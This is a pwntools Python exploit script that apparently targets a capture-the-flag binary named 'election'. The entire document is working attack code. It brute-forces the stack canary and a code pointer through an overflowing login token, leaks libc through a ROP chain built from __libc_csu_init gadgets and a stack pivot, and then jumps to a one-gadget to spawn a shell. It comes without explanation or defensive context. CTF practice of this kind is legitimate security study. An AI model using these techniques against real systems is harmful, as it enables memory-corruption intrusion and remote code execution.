from pwn import *

p = process('./election')
elf = ELF('./election')
libc = elf.libc

def login(token):
    p.sendlineafter('>', '1')
    p.sendafter(': ', token)

def register(token):
    p.sendlineafter('>', '2')
    p.sendafter(': ', token)

def vote(index):
    p.sendlineafter('>', '1')
    p.sendlineafter(': ', str(index))

def say(index, msg):
    p.sendlineafter('>', '2')
    p.sendlineafter(': ', str(index))
    p.sendafter(': ', msg)

def logout():
    p.sendlineafter('>', '3')

register('a'*184)
canary = '\x00'
success('finding canary...')
for i in range(7):
    for j in range(0x100):
        login('a'*184+canary+chr(j))
        # sleep(0.01)
        if p.recvline('>').find(b'Invalid token.') == -1:
            canary += chr(j)
            logout()
            break
success('canary = 0x%x', u64(canary))
success('finding __libc_csu_init...')
__libc_csu_init = ''
for i in range(8):
    for j in range(0x100):
        login('a'*184+canary+__libc_csu_init+chr(j))
        # sleep(0.01)
        if p.recvline('>').find(b'Invalid token.') == -1:
            __libc_csu_init += chr(j)
            logout()
            break
__libc_csu_init = u64(__libc_csu_init)
success('__libc_csu_init = 0x%x', __libc_csu_init)
base = __libc_csu_init - elf.symbols['__libc_csu_init']
success('base addresss = 0x%x', base)

bss2 = base + 0x202160 + 0x8
bss1 = base + 0x203000 - 0x100
readPLT = base + elf.plt['read']
leave_ret = base + 0x0000000000000be9
pop_rdi = base + 0x00000000000011a3
pop_rsi_r15 = base + 0x00000000000011a1
putsGOT = base + elf.got['puts']
putsPLT = base + elf.plt['puts']
readGOT = base + elf.got['read']
payload = p64(bss1) + p64(pop_rdi) + p64(putsGOT) + p64(putsPLT)
payload += p64(__libc_csu_init+90) + p64(0) # rbx
payload += p64(1) # rbp
payload += p64(readGOT) # r12
payload += p64(0) # r13
payload += p64(bss1) # r14 -> rsi
payload += p64(0x100) # r15 -> rdx
payload += p64(__libc_csu_init + 64)   # ret
payload += p64(0)*2 + p64(bss1) + p64(0)*4
payload += p64(leave_ret)

login(b'a'*8 + payload)

for j in range(25):
    register('a'*8)
    login('a'*8)
    for i in range(10):
        vote(1)
    logout()
register('a'*8)
login('a'*8)
for i in range(5):
    vote(1)

payload = b'a'*232+p64(u64(canary))+p64(bss2)+p64(leave_ret)
say(1, payload)
logout()
p.recvuntil('>\n')
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - libc.symbols['puts']
success('libc base = 0x%x', libc_base)
system = libc_base + libc.symbols['system']
sh = libc_base + next(libc.search(b'/bin/sh'))
# payload = p64(bss2) + p64(pop_rdi) + p64(sh) + p64(0x0000000000000906+base) + p64(system)
payload = p64(bss2) + p64(libc_base + 0x4f3c2)
p.send(payload)

p.interactive()
